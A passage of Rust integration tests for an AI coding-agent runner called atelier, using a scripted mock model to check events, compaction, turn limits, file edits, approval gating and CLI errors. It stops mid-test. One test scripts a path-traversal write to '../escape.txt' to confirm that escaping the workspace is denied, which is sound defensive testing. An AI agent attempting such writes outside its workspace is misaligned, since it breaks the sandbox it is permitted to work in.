//! Integration tests for `atelier run`. The runner is driven via its pure
//! `Runner` API with the `MockAdapter`-backed provider so tests stay
//! offline + deterministic. The binary-level path is covered by a single
//! `assert_cmd` test that confirms argv parsing + the "no provider yet"
//! error surface.

use std::path::PathBuf;
use std::sync::Arc;

use atelier_core::adapter::ToolCallRequest;
use atelier_core::protocol::Envelope;
use atelier_core::protocol_strategy::HARNESS_META_NAME;
use atelier_core::session::Event;
use atelier_core::State;

// Re-use the runner module from the `atelier` binary crate. `bin` crates
// don't expose their modules to integration tests directly; the workaround
// is to declare a small library crate alongside the binary. For
// dev-velocity we duplicate the path here via `#[path]` so the runner is
// available without restructuring the crate. If the runner grows enough
// to warrant a sibling `atelier-core-runner` crate, this is the seam.
// Phase C close — `runner.rs` references `crate::instrumentation` (which
// resolves to `atelier_cli::instrumentation` in the library build); the
// integration test crate is a separate crate, so we also `#[path]`-include
// `instrumentation.rs` here so `crate::instrumentation::…` resolves
// inside the included `runner` module.
#[path = "../src/instrumentation.rs"]
mod instrumentation;
// §1 BYOM (v60.9) — runner.rs references `crate::compaction::compact`
// for the context-overflow Compact arm. Mount `compaction` (and its
// dependency `compaction_blob`) the same way `instrumentation` is
// mounted so the path resolves inside the integration-test crate.
#[path = "../src/compaction.rs"]
mod compaction;
#[path = "../src/compaction_blob.rs"]
mod compaction_blob;
#[path = "../src/runner.rs"]
mod runner;
use runner::{DispatcherHandle, EventSink, MockResponse, ProviderChoice, Runner};

fn envelope_done() -> Envelope {
    Envelope {
        claimed_done: Some(true),
        ..Default::default()
    }
}

fn mock_envelope_tool_call(env: &Envelope) -> ToolCallRequest {
    // The native-tool emission strategy carries the envelope as a tool
    // call named `harness_meta` whose arguments ARE the envelope.
    ToolCallRequest {
        id: "harness-meta-1".into(),
        name: HARNESS_META_NAME.into(),
        arguments: serde_json::to_value(env).unwrap(),
    }
}

// PC-6 regression: verifies the producer-side wiring lands all four
// new event variants on the bus during a scripted run. The TUI's
// AppState consumes these in `apply()`; the GUI's `bridge_event`
// projects them. This test pins the producer contract.
#[tokio::test]
async fn run_broadcasts_message_plan_ledger_and_context_events() {
    use atelier_core::Event;

    let workspace = tempfile::TempDir::new().unwrap();

    // Single turn: assistant text + a real write_file tool call (drives
    // LedgerAppended via the dispatcher) + the harness_meta envelope
    // (which carries claimed_done so the loop terminates after the
    // ContextSnapshot fires).
    let write_call = ToolCallRequest {
        id: "tc-pc6".into(),
        name: "write_file".into(),
        arguments: serde_json::json!({"path": "pc6.txt", "content": "ok"}),
    };
    let responses = vec![MockResponse {
        assistant_text: "doing the write".into(),
        tool_calls: vec![write_call, mock_envelope_tool_call(&envelope_done())],
        overflow: None,
    }];

    let events = Arc::new(parking_lot::Mutex::new(Vec::new()));
    let runner = Runner::new(
        workspace.path().to_path_buf(),
        ProviderChoice::Mock { responses },
        EventSink::Capture(events.clone()),
    )
    .expect("mock runner construction is infallible")
    .with_max_turns(2);

    let report = runner.run("write pc6".into()).await.unwrap();
    assert_eq!(report.final_state, State::Done);

    let captured = events.lock();

    // MessageCommitted: at minimum the initial user prompt + the
    // assistant turn + the tool result.
    let messages: Vec<_> = captured
        .iter()
        .filter_map(|e| match e {
            Event::MessageCommitted { role, text } => Some((*role, text.clone())),
            _ => None,
        })
        .collect();
    assert!(
        messages.len() >= 3,
        "expected ≥3 MessageCommitted events, got {messages:?}"
    );
    let summary = format!("{messages:?}");
    assert!(summary.contains("User"), "events: {summary}");
    assert!(summary.contains("Assistant"), "events: {summary}");
    assert!(summary.contains("Tool"), "events: {summary}");
    assert!(
        summary.contains("write pc6"),
        "user prompt missing from bus: {summary}"
    );
    assert!(
        summary.contains("doing the write"),
        "assistant text missing: {summary}"
    );

    // LedgerAppended: one per tool call (the write_file dispatch).
    let ledger_count = captured
        .iter()
        .filter(|e| matches!(e, Event::LedgerAppended { .. }))
        .count();
    assert!(
        ledger_count >= 1,
        "expected ≥1 LedgerAppended events, got {ledger_count}"
    );

    // ContextSnapshot: emitted at end-of-turn after token counting.
    let context_count = captured
        .iter()
        .filter(|e| matches!(e, Event::ContextSnapshot { .. }))
        .count();
    assert!(
        context_count >= 1,
        "expected ≥1 ContextSnapshot, got {context_count}"
    );
}

// §1 BYOM context-window asymmetry (v60.9).
//
// Turn 1: MockAdapter returns `AdapterError::ContextOverflow { needed: 50, limit: 100 }`.
// The runner's Compact arm then issues a summary call (response #2 = the
// summary text), publishes `Event::ContextOverflowResolved { resolution:
// "compacted", … }`, and retries the turn — which pops response #3, a
// normal envelope with `claimed_done`.  The session reaches `State::Done`.
//
// The runner inserts the initial user prompt as a context item before
// turn 1 starts, so the auto-selector always has at least one
// unpinned candidate to compact. We feed the model a moderately long
// prompt so the freed token count is non-trivial.
#[tokio::test]
async fn run_recovers_from_context_overflow_via_compact_policy() {
    let workspace = tempfile::TempDir::new().unwrap();

    // Three queued responses (in order):
    //   1. ContextOverflow — first chat call on turn 1.
    //   2. Summary text — the compaction orchestrator's adapter call.
    //   3. Happy envelope with claimed_done — the retry of turn 1.
    let responses = vec![
        MockResponse::context_overflow(50, 100),
        MockResponse::new("Summary: covers prompt + seeded items.", vec![]),
        MockResponse::new("ok, done", vec![mock_envelope_tool_call(&envelope_done())]),
    ];

    let events = Arc::new(parking_lot::Mutex::new(Vec::new()));

    let runner = Runner::new(
        workspace.path().to_path_buf(),
        ProviderChoice::Mock { responses },
        EventSink::Capture(events.clone()),
    )
    .expect("mock runner construction is infallible")
    .with_max_turns(2);

    // Long enough prompt that its char/4 approximation yields >0
    // tokens so the auto-selector picks at least one item.
    let prompt = "demonstrate the §1 context-overflow recovery path \
                  with a deliberately long prompt that the auto-selector \
                  can pick up and compact away on the first overflow."
        .to_string();

    let report = runner.run(prompt).await.expect("run must succeed");
    assert_eq!(report.final_state, State::Done);

    // Pin the contract: a ContextOverflowResolved { resolution:
    // "compacted", … } landed on the bus before the run terminated.
    let captured = events.lock();
    let resolved = captured
        .iter()
        .find_map(|e| match e {
            Event::ContextOverflowResolved {
                resolution,
                freed_tokens,
                items_compacted,
            } => Some((*resolution, *freed_tokens, *items_compacted)),
            _ => None,
        })
        .expect("ContextOverflowResolved must be emitted");
    assert_eq!(resolved.0, "compacted");
    assert!(
        resolved.1.is_some_and(|t| t > 0),
        "freed_tokens must be populated and > 0; got {:?}",
        resolved.1
    );
    assert!(
        resolved.2.is_some_and(|n| n >= 1),
        "items_compacted must be populated and >= 1; got {:?}",
        resolved.2
    );

    // Also pin the side-effect: a CompactionExecuted event landed (the
    // v60.5 terminal marker fires from the dispatcher, regardless of
    // the overflow context — its presence proves the auto-compaction
    // actually ran instead of being a no-op surface).
    let compaction_count = captured
        .iter()
        .filter(|e| matches!(e, Event::CompactionExecuted { .. }))
        .count();
    assert_eq!(
        compaction_count, 1,
        "expected exactly one CompactionExecuted; got {compaction_count}"
    );
}

#[tokio::test]
async fn run_loops_until_claimed_done_and_reaches_terminal_state() {
    let workspace = tempfile::TempDir::new().unwrap();

    let responses = vec![MockResponse {
        assistant_text: "ack".into(),
        tool_calls: vec![mock_envelope_tool_call(&envelope_done())],
        overflow: None,
    }];

    let events = Arc::new(parking_lot::Mutex::new(Vec::new()));
    let runner = Runner::new(
        workspace.path().to_path_buf(),
        ProviderChoice::Mock { responses },
        EventSink::Capture(events.clone()),
    )
    .expect("mock runner construction is infallible")
    .with_max_turns(4);

    let report = runner.run("rename foo to bar".into()).await.unwrap();
    assert_eq!(report.turns, 1);
    assert_eq!(report.final_state, State::Done);

    // The actor emitted the expected transitions on the bus.
    let kinds: Vec<String> = events.lock().iter().map(|e| format!("{e:?}")).collect();
    let summary = kinds.join("|");
    assert!(summary.contains("Streaming"), "events: {summary}");
    assert!(summary.contains("Verifying"), "events: {summary}");
}

#[tokio::test]
async fn run_dispatches_real_tool_calls_and_loops() {
    // Turn 1: model emits a `write_file` tool call (no claimed_done).
    // Turn 2: model emits envelope with claimed_done.
    let workspace = tempfile::TempDir::new().unwrap();

    let write_call = ToolCallRequest {
        id: "tc-1".into(),
        name: "write_file".into(),
        arguments: serde_json::json!({"path": "hello.txt", "content": "hi"}),
    };

    let responses = vec![
        MockResponse {
            assistant_text: "writing".into(),
            tool_calls: vec![write_call],
            overflow: None,
        },
        MockResponse {
            assistant_text: "done".into(),
            tool_calls: vec![mock_envelope_tool_call(&envelope_done())],
            overflow: None,
        },
    ];

    let runner = Runner::new(
        workspace.path().to_path_buf(),
        ProviderChoice::Mock { responses },
        EventSink::Null,
    )
    .expect("mock runner construction is infallible")
    .with_max_turns(4);

    let report = runner.run("write a hello file".into()).await.unwrap();
    assert_eq!(report.turns, 2);
    assert_eq!(report.final_state, State::Done);
    // The tool actually wrote the file.
    assert_eq!(
        std::fs::read(workspace.path().join("hello.txt")).unwrap(),
        b"hi"
    );
}

#[tokio::test]
async fn run_bails_after_max_turns_without_claimed_done() {
    let workspace = tempfile::TempDir::new().unwrap();

    // Three responses, none claim done → loop should hit max_turns=2 and
    // exit with final_state = Streaming (didn't reach Verifying).
    let responses = vec![
        MockResponse {
            assistant_text: "..".into(),
            tool_calls: vec![],
            overflow: None,
        },
        MockResponse {
            assistant_text: "..".into(),
            tool_calls: vec![],
            overflow: None,
        },
    ];

    let runner = Runner::new(
        workspace.path().to_path_buf(),
        ProviderChoice::Mock { responses },
        EventSink::Null,
    )
    .expect("mock runner construction is infallible")
    .with_max_turns(2);

    let report = runner.run("never done".into()).await.unwrap();
    assert_eq!(report.turns, 2);
    assert_ne!(report.final_state, State::Done);
    assert_eq!(report.dod_passed, None); // no DoD configured
}

#[tokio::test]
async fn run_scripted_multi_file_rename_drives_phase_c_mechanical_gate() {
    // The §3 mechanical gate in spec form: a scripted rename across N
    // files, agent emits `claimed_changes` + write_file calls per file,
    // final on-disk state matches the reference. Smaller N here (3 files)
    // to keep the test brisk; production gate scales to 10.
    let workspace = tempfile::TempDir::new().unwrap();
    for n in 1..=3 {
        std::fs::write(
            workspace.path().join(format!("file_{n}.txt")),
            format!("old contents {n}"),
        )
        .unwrap();
    }

    let mut responses = Vec::new();
    for n in 1..=3 {
        responses.push(MockResponse {
            assistant_text: format!("rewriting file_{n}"),
            tool_calls: vec![ToolCallRequest {
                id: format!("tc-{n}"),
                name: "write_file".into(),
                arguments: serde_json::json!({
                    "path": format!("file_{n}.txt"),
                    "content": format!("new contents {n}"),
                }),
            }],
            overflow: None,
        });
    }
    responses.push(MockResponse {
        assistant_text: "all renamed".into(),
        tool_calls: vec![mock_envelope_tool_call(&envelope_done())],
        overflow: None,
    });

    let events = Arc::new(parking_lot::Mutex::new(Vec::new()));
    let runner = Runner::new(
        workspace.path().to_path_buf(),
        ProviderChoice::Mock { responses },
        EventSink::Capture(events.clone()),
    )
    .expect("mock runner construction is infallible")
    .with_max_turns(8);

    let report = runner.run("rename 3 files".into()).await.unwrap();
    assert_eq!(report.final_state, State::Done);
    assert_eq!(report.turns, 4); // 3 write turns + 1 done turn

    // Final on-disk state matches the reference (byte-equal).
    for n in 1..=3 {
        let got = std::fs::read(workspace.path().join(format!("file_{n}.txt"))).unwrap();
        assert_eq!(got, format!("new contents {n}").as_bytes());
    }

    // The bus saw N `EditStaged` events for the writes.
    let edit_staged_count = events
        .lock()
        .iter()
        .filter(|e| matches!(e, Event::EditStaged { .. }))
        .count();
    assert_eq!(edit_staged_count, 3);
}

#[tokio::test]
async fn run_persists_session_to_disk_under_atelier_sessions() {
    let workspace = tempfile::TempDir::new().unwrap();
    let responses = vec![MockResponse {
        assistant_text: "done".into(),
        tool_calls: vec![mock_envelope_tool_call(&envelope_done())],
        overflow: None,
    }];
    let runner = Runner::new(
        workspace.path().to_path_buf(),
        ProviderChoice::Mock { responses },
        EventSink::Null,
    )
    .expect("mock runner construction is infallible");
    let report = runner.run("nothing".into()).await.unwrap();
    // session.json exists under .atelier/sessions/<uuid>/
    let session_dir: PathBuf = workspace
        .path()
        .join(".atelier")
        .join("sessions")
        .join(report.session_id.0.to_string());
    let session_file = session_dir.join("session.json");
    assert!(
        session_file.exists(),
        "expected session file at {session_file:?}"
    );
}

// ---- binary-level argv smoke test ----

#[test]
fn binary_help_includes_run_subcommand() {
    let mut cmd = assert_cmd::Command::cargo_bin("atelier").unwrap();
    cmd.arg("--help");
    let out = cmd.output().unwrap();
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(stdout.contains("run"), "help missing run: {stdout}");
    assert!(
        stdout.contains("--provider"),
        "help missing --provider: {stdout}"
    );
}

#[test]
fn binary_run_rejects_unknown_provider_with_useful_error() {
    let mut cmd = assert_cmd::Command::cargo_bin("atelier").unwrap();
    cmd.args(["run", "--provider", "openai", "hi"]);
    let out = cmd.output().unwrap();
    assert!(!out.status.success());
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("unknown provider"),
        "stderr should name the failure mode: {stderr}"
    );
    assert!(
        stderr.contains("anthropic"),
        "stderr should list supported providers: {stderr}"
    );
}

#[test]
fn binary_run_anthropic_requires_api_key_in_env() {
    let mut cmd = assert_cmd::Command::cargo_bin("atelier").unwrap();
    cmd.env_remove("ANTHROPIC_API_KEY");
    cmd.args([
        "run",
        "--provider",
        "anthropic",
        "--model",
        "anthropic:claude-opus-4-7",
        "hi",
    ]);
    let out = cmd.output().unwrap();
    assert!(!out.status.success());
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("ANTHROPIC_API_KEY"),
        "stderr should hint at the missing env var: {stderr}"
    );
}

#[test]
fn binary_run_anthropic_rejects_misprefixed_model() {
    let mut cmd = assert_cmd::Command::cargo_bin("atelier").unwrap();
    cmd.env("ANTHROPIC_API_KEY", "sk-test");
    cmd.args([
        "run",
        "--provider",
        "anthropic",
        "--model",
        "claude-opus-4-7", // missing anthropic: prefix
        "hi",
    ]);
    let out = cmd.output().unwrap();
    assert!(!out.status.success());
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("anthropic:"),
        "stderr should hint at the required prefix: {stderr}"
    );
}

#[test]
fn binary_run_rejects_empty_prompt() {
    let mut cmd = assert_cmd::Command::cargo_bin("atelier").unwrap();
    cmd.args(["run", "--provider", "mock", ""]);
    let out = cmd.output().unwrap();
    assert!(!out.status.success());
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(stderr.contains("prompt is empty"), "stderr: {stderr}");
}

// v25.2-F regression: when a tool call fails with an error message
// containing characters that need JSON escaping (quotes, backslashes,
// newlines), the synthesized `tool_result` payload must be valid JSON.
// Pre-fix `format!("{{\"error\":\"{e}\"}}")` produced invalid JSON the
// model received and likely mishandled.
#[tokio::test]
async fn tool_error_with_quotes_produces_valid_json_tool_result() {
    let workspace = tempfile::TempDir::new().unwrap();

    // A write_file call with a path that's outside the workspace — the
    // tool dispatcher returns a PermissionDenied error whose Display
    // contains the path string. Path traversal escapes (`..`) trigger
    // the error reliably.
    let bad_write = ToolCallRequest {
        id: "tc-bad".into(),
        name: "write_file".into(),
        arguments: serde_json::json!({
            "path": "../escape.txt",
            "content": "x",
        }),
    };

    let responses = vec![
        MockResponse {
            assistant_text: "trying to escape".into(),
            tool_calls: vec![bad_write],
            overflow: None,
        },
        MockResponse {
            assistant_text: "done".into(),
            tool_calls: vec![mock_envelope_tool_call(&envelope_done())],
            overflow: None,
        },
    ];

    let runner = Runner::new(
        workspace.path().to_path_buf(),
        ProviderChoice::Mock { responses },
        EventSink::Null,
    )
    .expect("mock runner construction is infallible")
    .with_max_turns(4);

    // The run completes successfully — the failed tool call's error
    // message is fed back as a JSON-escaped tool_result, and the next
    // turn proceeds without the conversation history being corrupted by
    // unescaped quotes.
    let report = runner.run("escape".into()).await.unwrap();
    assert_eq!(report.final_state, State::Done);
}

// v47 DR-F: GUI driver path — Runner with AwaitApproval +
// DispatcherHandle end-to-end. The GUI's `start_demo_run` Tauri
// command builds exactly this shape; this test exercises it without
// Tauri.
#[tokio::test]
async fn await_approval_via_runner_with_dispatcher_handle_round_trips() {
    use atelier_core::dispatcher::ApprovalPolicy;
    use atelier_core::session::Event;

    let workspace = tempfile::TempDir::new().unwrap();

    let write_call = ToolCallRequest {
        id: "tc-write".into(),
        name: "write_file".into(),
        arguments: serde_json::json!({
            "path": "approved.txt",
            "content": "gated by user",
        }),
    };
    let responses = vec![MockResponse {
        assistant_text: "demo write".into(),
        tool_calls: vec![write_call, mock_envelope_tool_call(&envelope_done())],
        overflow: None,
    }];

    // Two sinks: Capture for event assertions, plus the DispatcherHandle
    // to route the eventual submit_approval.
    let events = Arc::new(parking_lot::Mutex::new(Vec::new()));
    let handle = DispatcherHandle::new();

    let runner = Runner::new(
        workspace.path().to_path_buf(),
        ProviderChoice::Mock { responses },
        EventSink::Capture(events.clone()),
    )
    .expect("mock runner construction is infallible")
    .with_approval_policy(ApprovalPolicy::AwaitApproval)
    .with_dispatcher_handle(handle.clone())
    .with_max_turns(2);

    // Spawn the runner; concurrently poll the captured events for the
    // pending-approval signal, then submit through the handle.
    let runner_task = tokio::spawn(async move { runner.run("write a file".into()).await });

    // Poll until either we see StagingPendingApproval (and submit) or
    // the runner finishes. Bounded so a regression that never emits
    // the pending event fails the test instead of hanging.
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
    let mut submitted = false;
    while std::time::Instant::now() < deadline && !submitted {
        let snapshot: Vec<Event> = events.lock().clone();
        for ev in snapshot {
            if let Event::StagingPendingApproval {
                commit_id, files, ..
            } = ev
            {
                assert_eq!(files.len(), 1, "one pending file");
                assert_eq!(files[0].path, PathBuf::from("approved.txt"));
                let sd = handle
                    .get()
                    .expect("DispatcherHandle populated by runner before staging");
                assert!(sd.submit_approval_files(commit_id, vec![PathBuf::from("approved.txt")]));
                submitted = true;
                break;
            }
        }
        if !submitted {
            tokio::time::sleep(std::time::Duration::from_millis(20)).await;
        }
    }
    assert!(submitted, "never saw StagingPendingApproval within 10s");

    let report = runner_task.await.unwrap().unwrap();
    assert_eq!(report.final_state, State::Done);

    // File landed on disk — proves the round-trip drove commit_selected.
    let body = std::fs::read(workspace.path().join("approved.txt")).unwrap();
    assert_eq!(body, b"gated by user");

    // After the run ends, the DispatcherHandle should be cleared.
    assert!(
        handle.get().is_none(),
        "Runner::run must clear the DispatcherHandle on shutdown"
    );
}

#[tokio::test]
async fn await_approval_via_runner_with_full_reject_drops_the_write() {
    use atelier_core::dispatcher::ApprovalPolicy;
    use atelier_core::session::Event;

    let workspace = tempfile::TempDir::new().unwrap();
    let write_call = ToolCallRequest {
        id: "tc-write".into(),
        name: "write_file".into(),
        arguments: serde_json::json!({
            "path": "rejected.txt",
            "content": "user said no",
        }),
    };
    let responses = vec![MockResponse {
        assistant_text: "demo write".into(),
        tool_calls: vec![write_call, mock_envelope_tool_call(&envelope_done())],
        overflow: None,
    }];

    let events = Arc::new(parking_lot::Mutex::new(Vec::new()));
    let handle = DispatcherHandle::new();
    let runner = Runner::new(
        workspace.path().to_path_buf(),
        ProviderChoice::Mock { responses },
        EventSink::Capture(events.clone()),
    )
    .expect("mock runner construction is infallible")
    .with_approval_policy(ApprovalPolicy::AwaitApproval)
    .with_dispatcher_handle(handle.clone())
    .with_max_turns(2);

    let runner_task = tokio::spawn(async move { runner.run("write a file".into()).await });

    // Submit empty accept-set = full reject.
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
    let mut submitted = false;
    while std::time::Instant::now() < deadline && !submitted {
        let snapshot: Vec<Event> = events.lock().clone();
        for ev in snapshot {
            if let Event::StagingPendingApproval { commit_id, .. } = ev {
                let sd = handle.get().unwrap();
                assert!(sd.submit_approval_files(commit_id, vec![]));
                submitted = true;
                break;
            }
        }
        if !submitted {
            tokio::time::sleep(std::time::Duration::from_millis(20)).await;
        }
    }
    assert!(submitted);

    let report = runner_task.await.unwrap().unwrap();
    assert_eq!(report.final_state, State::Done);

    // File NOT on disk — rejection short-circuited commit.
    assert!(
        !workspace.path().join("rejected.txt").exists(),
        "rejected file should not land"
    );
}

// ---------- v55 §5 mutator round-trips ----------
//
// These exercise the new SessionDispatcher mutator surface end-to-end
// through the Runner: a scripted MockAdapter run brings the
// ContextManager / MemoryStore / PlanCanvas into a known state via the
// snapshot bus, then the test invokes a mutator via the live
// `DispatcherHandle` and asserts the follow-up snapshot reflects the
// change.

/// v57 (M-smell-2) — tightened poll interval + tokio::time::timeout
/// wrapper. The pre-v57 helper slept 20 ms between polls of the
/// captured-events Vec, which gave up to a 20 ms reaction-delay per
/// event and a real flake budget on loaded CI runners. The new shape:
///
///   * `yield_now` between checks rather than a fixed sleep — keeps
///     CPU bounded but reacts to a newly-pushed event within one
///     scheduler tick;
///   * `tokio::time::timeout` so the deadline is wall-clock (the
///     `Instant::now` loop was technically equivalent but
///     `tokio::time::timeout` plays nicer with paused-clock tests
///     should those land);
///   * a single sleep at the loop tail so a stuck `f` doesn't busy
///     spin the tokio worker when no event ever lands.
///
/// `EventSink::Capture` is still the underlying read surface; a
/// future refactor to use a fresh `broadcast::Receiver` would
/// eliminate the Vec lock entirely.
async fn wait_until<F: FnMut() -> bool>(mut f: F, deadline: std::time::Duration, label: &str) {
    let fut = async {
        loop {
            if f() {
                return;
            }
            tokio::task::yield_now().await;
            // Single small sleep so a never-firing predicate doesn't
            // hot-spin the tokio worker — the loop is otherwise
            // tight.
            tokio::time::sleep(std::time::Duration::from_millis(1)).await;
        }
    };
    if tokio::time::timeout(deadline, fut).await.is_err() {
        panic!("timed out waiting for {label}");
    }
}

#[tokio::test]
async fn v55_pin_context_item_round_trips_through_dispatcher() {
    let workspace = tempfile::TempDir::new().unwrap();
    let responses = vec![MockResponse {
        assistant_text: "ok".into(),
        tool_calls: vec![mock_envelope_tool_call(&envelope_done())],
        overflow: None,
    }];
    let events = Arc::new(parking_lot::Mutex::new(Vec::new()));
    let handle = DispatcherHandle::new();
    let runner = Runner::new(
        workspace.path().to_path_buf(),
        ProviderChoice::Mock { responses },
        EventSink::Capture(events.clone()),
    )
    .expect("mock runner construction is infallible")
    .with_dispatcher_handle(handle.clone())
    .with_max_turns(2);

    let runner_task = tokio::spawn(async move { runner.run("hello".into()).await });

    // Wait for the first ContextItems snapshot — captures the user
    // prompt + the assistant turn. The user-prompt item is the first
    // one and is the one we'll pin.
    let mut target_id: Option<String> = None;
    wait_until(
        || {
            let snap = events.lock().clone();
            for ev in snap {
                if let Event::ContextItems { items } = ev {
                    if let Some(first) = items.first() {
                        target_id = Some(first.id.clone());
                        return true;
                    }
                }
            }
            false
        },
        std::time::Duration::from_secs(10),
        "initial ContextItems",
    )
    .await;
    let target = target_id.expect("first item present");
    let before = events.lock().len();

    let sd = handle.get().expect("DispatcherHandle populated");
    sd.pin_context_item(&target).expect("pin succeeds");

    // Assert: a subsequent ContextItems event shows pinned=true on the
    // target id.
    wait_until(
        || {
            let snap = events.lock().clone();
            for ev in snap.into_iter().skip(before) {
                if let Event::ContextItems { items } = ev {
                    if items.iter().any(|i| i.id == target && i.pinned) {
                        return true;
                    }
                }
            }
            false
        },
        std::time::Duration::from_secs(10),
        "ContextItems with pinned=true after pin_context_item",
    )
    .await;

    let _ = runner_task.await;
}

#[tokio::test]
async fn v55_add_memory_card_round_trips_through_dispatcher() {
    let workspace = tempfile::TempDir::new().unwrap();
    let responses = vec![MockResponse {
        assistant_text: "ok".into(),
        tool_calls: vec![mock_envelope_tool_call(&envelope_done())],
        overflow: None,
    }];
    let events = Arc::new(parking_lot::Mutex::new(Vec::new()));
    let handle = DispatcherHandle::new();
    let runner = Runner::new(
        workspace.path().to_path_buf(),
        ProviderChoice::Mock { responses },
        EventSink::Capture(events.clone()),
    )
    .expect("mock runner construction is infallible")
    .with_dispatcher_handle(handle.clone())
    .with_max_turns(2);

    let runner_task = tokio::spawn(async move { runner.run("hi".into()).await });

    // Wait until the DispatcherHandle is populated by the runner.
    wait_until(
        || handle.get().is_some(),
        std::time::Duration::from_secs(10),
        "DispatcherHandle populated",
    )
    .await;
    let sd = handle.get().unwrap();

    let id = sd
        .add_memory_card("a long-lived fact".into(), "2026-05-17T10:00:00Z")
        .expect("add memory card");
    assert!(id.starts_with("mem-"));

    // Wait for a MemoryCards event that carries the new card.
    wait_until(
        || {
            let snap = events.lock().clone();
            for ev in snap {
                if let Event::MemoryCards { cards } = ev {
                    if cards.iter().any(|c| c.id == id) {
                        return true;
                    }
                }
            }
            false
        },
        std::time::Duration::from_secs(10),
        "MemoryCards event with the new card id",
    )
    .await;

    let _ = runner_task.await;
}

#[tokio::test]
async fn v55_mark_plan_step_done_round_trips_through_dispatcher() {
    use atelier_core::plan::PlanStatus;

    let workspace = tempfile::TempDir::new().unwrap();
    let responses = vec![MockResponse {
        assistant_text: "ok".into(),
        tool_calls: vec![mock_envelope_tool_call(&envelope_done())],
        overflow: None,
    }];
    let events = Arc::new(parking_lot::Mutex::new(Vec::new()));
    let handle = DispatcherHandle::new();
    let runner = Runner::new(
        workspace.path().to_path_buf(),
        ProviderChoice::Mock { responses },
        EventSink::Capture(events.clone()),
    )
    .expect("mock runner construction is infallible")
    .with_dispatcher_handle(handle.clone())
    .with_max_turns(2);

    let runner_task = tokio::spawn(async move { runner.run("plan it".into()).await });

    wait_until(
        || handle.get().is_some(),
        std::time::Duration::from_secs(10),
        "DispatcherHandle populated",
    )
    .await;
    let sd = handle.get().unwrap();

    let step_id = sd.add_plan_step("first step".into()).unwrap();

    sd.mark_plan_step_status(&step_id, PlanStatus::Done)
        .expect("mark done");

    wait_until(
        || {
            let snap = events.lock().clone();
            for ev in snap {
                if let Event::PlanSnapshot { steps } = ev {
                    if steps
                        .iter()
                        .any(|s| s.id == step_id && s.status == PlanStatus::Done)
                    {
                        return true;
                    }
                }
            }
            false
        },
        std::time::Duration::from_secs(10),
        "PlanSnapshot with mark_done applied",
    )
    .await;

    let _ = runner_task.await;
}

// ---------- v56 §3 Phase C mechanical gate (production scale) ----------
//
// The spec §3 mechanical gate names a "10-file rename" scenario as the
// production target. The pre-v56 test at the top of this file
// (`run_scripted_multi_file_rename_drives_phase_c_mechanical_gate`)
// ships at N=3 for brevity; this test pins the N=10 contract:
//
//   * agent emits one write_file per file, then a claimed_done envelope,
//   * live-diff incremental — one `EditStaged` event per write, in
//     commit order, BEFORE the final claimed_done arrives,
//   * final on-disk state is byte-equal to the reference for every
//     file.

#[tokio::test]
async fn v56_phase_c_mechanical_gate_at_ten_files_lines_up_live_diff_and_final_state() {
    let workspace = tempfile::TempDir::new().unwrap();
    for n in 1..=10 {
        std::fs::write(
            workspace.path().join(format!("file_{n:02}.txt")),
            format!("old contents {n}"),
        )
        .unwrap();
    }

    let mut responses = Vec::new();
    for n in 1..=10 {
        responses.push(MockResponse {
            assistant_text: format!("rewriting file_{n:02}"),
            tool_calls: vec![ToolCallRequest {
                id: format!("tc-{n}"),
                name: "write_file".into(),
                arguments: serde_json::json!({
                    "path": format!("file_{n:02}.txt"),
                    "content": format!("new contents {n}"),
                }),
            }],
            overflow: None,
        });
    }
    responses.push(MockResponse {
        assistant_text: "all ten renamed".into(),
        tool_calls: vec![mock_envelope_tool_call(&envelope_done())],
        overflow: None,
    });

    let events = Arc::new(parking_lot::Mutex::new(Vec::new()));
    let runner = Runner::new(
        workspace.path().to_path_buf(),
        ProviderChoice::Mock { responses },
        EventSink::Capture(events.clone()),
    )
    .expect("mock runner construction is infallible")
    .with_max_turns(20);

    let report = runner.run("rename 10 files".into()).await.unwrap();
    assert_eq!(report.final_state, State::Done);
    assert_eq!(report.turns, 11, "10 write turns + 1 done turn");

    // Final on-disk state byte-equal for every file.
    for n in 1..=10 {
        let got = std::fs::read(workspace.path().join(format!("file_{n:02}.txt"))).unwrap();
        assert_eq!(
            got,
            format!("new contents {n}").as_bytes(),
            "file_{n:02} mismatch"
        );
    }

    // Live-diff incremental — exactly 10 EditStaged events, in commit
    // order matching the scripted writes.
    let captured = events.lock();
    let edit_staged_paths: Vec<PathBuf> = captured
        .iter()
        .filter_map(|e| match e {
            Event::EditStaged { path, .. } => Some(path.clone()),
            _ => None,
        })
        .collect();
    assert_eq!(
        edit_staged_paths.len(),
        10,
        "expected exactly 10 EditStaged events, got {}",
        edit_staged_paths.len()
    );
    for (i, path) in edit_staged_paths.iter().enumerate() {
        let expected = format!("file_{:02}.txt", i + 1);
        assert_eq!(
            path,
            &PathBuf::from(&expected),
            "EditStaged event #{i} should be for {expected}"
        );
    }
}

#[tokio::test]
async fn v57_initial_context_items_event_fires_before_first_turn() {
    // Regression for M-bug-3 — pre-v57 the first `ContextItems`
    // snapshot only landed at the end of turn 1. A run with
    // max_turns=0 never produced one, so a UI subscriber saw
    // `MessageCommitted{User}` but an empty Context panel forever.
    let workspace = tempfile::TempDir::new().unwrap();
    let events = Arc::new(parking_lot::Mutex::new(Vec::new()));
    let runner = Runner::new(
        workspace.path().to_path_buf(),
        ProviderChoice::Mock {
            responses: Vec::new(),
        },
        EventSink::Capture(events.clone()),
    )
    .expect("mock runner construction is infallible")
    .with_max_turns(0);

    let _ = runner.run("greetings".into()).await.unwrap();

    let captured = events.lock();
    let mut saw_initial_items = false;
    for ev in captured.iter() {
        if let Event::ContextItems { items } = ev {
            if items.iter().any(|i| i.label.contains("greetings")) {
                saw_initial_items = true;
                break;
            }
        }
    }
    assert!(
        saw_initial_items,
        "ContextItems with the user prompt must fire before turn-loop bails on max_turns=0"
    );
}

#[tokio::test]
async fn v56_envelope_claimed_changes_surfaces_as_bus_event() {
    use atelier_core::protocol::{ClaimedChange, ClaimedChangeKind};

    let workspace = tempfile::TempDir::new().unwrap();
    let env = Envelope {
        claimed_done: Some(true),
        claimed_changes: Some(vec![ClaimedChange {
            path: "src/lib.rs".into(),
            kind: ClaimedChangeKind::Edit,
            summary: "fix off-by-one in the parser".into(),
        }]),
